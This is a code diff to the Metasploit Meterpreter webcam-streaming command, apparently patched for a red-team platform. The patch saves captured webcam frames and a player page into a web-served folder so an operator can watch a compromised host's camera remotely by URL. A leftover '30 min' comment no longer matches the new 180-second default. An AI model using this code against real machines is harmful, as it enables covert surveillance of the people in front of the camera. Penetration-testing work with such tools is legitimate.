@@ -173,14 +173,14 @@ class Console::CommandDispatcher::Stdapi::Webcam
     print_status("Starting...")
     stream_path = Rex::Text.rand_text_alpha(8) + ".jpeg"
     player_path = Rex::Text.rand_text_alpha(8) + ".html"
-    duration = 1800
+    duration = 180
     quality  = 50
-    view     = true
+    view = false
     index    = 1
 
     webcam_snap_opts = Rex::Parser::Arguments.new(
       "-h" => [ false, "Help Banner" ],
-      "-d" => [ true, "The stream duration in seconds (Default: 1800)" ], # 30 min
+      "-d" => [true, "The stream duration in seconds (Default: 180)"], # 30 min
       "-i" => [ true, "The index of the webcam to use (Default: 1)" ],
       "-q" => [ true, "The stream quality (Default: '#{quality}')" ],
       "-s" => [ true, "The stream file path (Default: '#{stream_path}')" ],
@@ -212,17 +212,18 @@ class Console::CommandDispatcher::Stdapi::Webcam
 
     print_status("Preparing player...")
     html = stream_html_template('screenshare', client.sock.peerhost, stream_path)
-    ::File.open(player_path, 'wb') do |f|
+    full_player_path = File.join("/root/viper/dist/icons", player_path)
+    ::File.open(full_player_path, 'wb') do |f|
       f.write(html)
     end
-    path = ::File.expand_path(player_path)
-    if view
-      print_status("Opening player at: #{path}")
-      Rex::Compat.open_file(path)
-    else
-      print_status("Please open the player manually with a browser: #{path}")
-    end
-
+    # path = ::File.expand_path(player_path)
+    # if view
+    #   print_status("Opening player at: #{path}")
+    #   Rex::Compat.open_file(path)
+    # else
+    #   print_status("Please open the player manually with a browser: #{path}")
+    # end
+    print_status("Please open the player manually by url: https://vpsip:60000/icons/#{player_path}")
     print_status("Streaming...")
     begin
       client.webcam.webcam_start(index)
@@ -231,7 +232,8 @@ class Console::CommandDispatcher::Stdapi::Webcam
         while client do
           data = client.webcam.webcam_get_frame(quality)
           if data
-            ::File.open(stream_path, 'wb') do |f|
+            full_stream_path = File.join("/root/viper/dist/icons", stream_path)
+            ::File.open(full_stream_path, 'wb') do |f|
               f.write(data)
             end
             data = nil
